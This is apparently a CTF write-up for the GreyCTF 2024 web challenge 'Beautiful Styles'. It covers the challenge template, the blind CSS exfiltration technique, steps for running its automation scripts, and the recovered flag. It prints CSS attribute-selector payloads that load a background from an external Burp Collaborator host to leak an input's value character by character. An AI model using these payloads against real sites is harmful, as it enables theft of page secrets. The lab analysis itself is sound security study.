---
title: Beautiful Styles
categories: GreyCTF 2024, Web
date: 2024-04-23
date_time: 2024-04-23 19:50
tags: 
- web/css/injection
details: CSS XS-Leak
difficulty: 2.5
solution: "https://github.com/NUSGreyhats/greyctf24-challs-public/tree/main/quals/web/beautiful-styles"
img_path: /Writeups/CTF/GreyCTF%202024/Web/Beautiful%20Styles/attachments/
image:
  src: Beautiful%20Styles-20240510000105525.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Challenge Description

I opened a contest to see who could create the most beautiful CSS styles. Feel free to submit your CSS styles to me and I will add them to my website to judge them. I'll even give you a sample of my site to get you started. Flag only consists of numbers and uppercase letters and the lowercase characterÂ `f`Â (the exception is the flag format of grey{.+})

# Source Code Analysis


```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>My Beautiful Site</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <link href="/uploads/{{submit_id}}.css" rel="stylesheet" />
  </head>
  <body>
    <div class="container">
      <h1 id="title">Welcome to my beautiful site</h1>
      <p id="sub-header">
        Here is some content that I want to share with you. An example can be
        this flag:
      </p>
      <input id="flag" value="{{ flag }}" />
    </div>
    <div class="container mt-4">
      <form action="/judge/{{submit_id}}" method="post">
        <input type="submit" value="Submit for judging">
      </form>
    </div>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
```
>[!INFO] Vulnerability Details:
>Refer to [this](https://portswigger.net/research/blind-css-exfiltration)
>- Based on the challenge description, it is hinted that CSS exfiltration is possible, and we know the possible characters the flag contains.
>- The flag is generated by a template engine, can be seen from `{{ }}`
>- CSS exfiltration works by loading a background image from an external site when a specific variable value exists."
{: .prompt-info}
```
input[value^="a"] {  
Â Â color:red;  
Â Â background:url(http://w52oa1fs4nbggxqy4mw7ydb15sbjz9ny.oastify.com)
}
```
>[!EXAMPLE] For example, if the input element has a value that begins with `a`, the element will be red and the background image will be loaded, which will make a request to our burp collaborator 
{: .prompt-info}


# Solution


- Payload
	```
	input[value^="grey{"] {  
	  color:red;  
	  background:url(http://w52oa1fs4nbggxqy4mw7ydb15sbjz9ny.oastify.com)
	}
	```
	>[!INFO] Iterate through all uppercase letters + `f` and numbers 
	{: .prompt-info}


## Manual
![](2iYhEiyqAg.mp4)



## Semi-Auto Script
![](semi_auto.py)


1. Install requirements
	```
	â”Œâ”€â”€(rootðŸ’€kali)-[~/â€¦/ctf/greyCTF2024/WEB/Beautiful Styles]
	â””â”€$ pip3 install selenium pyngrok
	```
2. Run script
	```
	â”Œâ”€â”€(rootðŸ’€kali)-[~/â€¦/ctf/greyCTF2024/WEB/Beautiful Styles]
	â””â”€$ python3 semi_auto.py
	```
3. Demo 
	![](TNQyqBL0CV.mp4)



## Script

![](auto.py)

1. Install `geckdriver`[Releases Â· mozilla/geckodriver](https://github.com/mozilla/geckodriver/releases)
2. Install requirements
	```
	â”Œâ”€â”€(rootðŸ’€kali)-[~/â€¦/ctf/greyCTF2024/WEB/Beautiful Styles]
	â””â”€$ pip3 install selenium pyngrok
	```
3. Run script
	```
	./geckodriver &
	
	â”Œâ”€â”€(rootðŸ’€kali)-[~/â€¦/ctf/greyCTF2024/WEB/Beautiful Styles]
	â””â”€$ export NGROK_AUTHTOKEN=x
	
	â”Œâ”€â”€(rootðŸ’€kali)-[~/â€¦/ctf/greyCTF2024/WEB/Beautiful Styles]
	â””â”€$ python3 auto.py
	
	Flag: grey{X5S34RCH1fY0UC4NF1ND1T}	
	```

4. Demo 
	![](aQM7QZyd60.mp4)

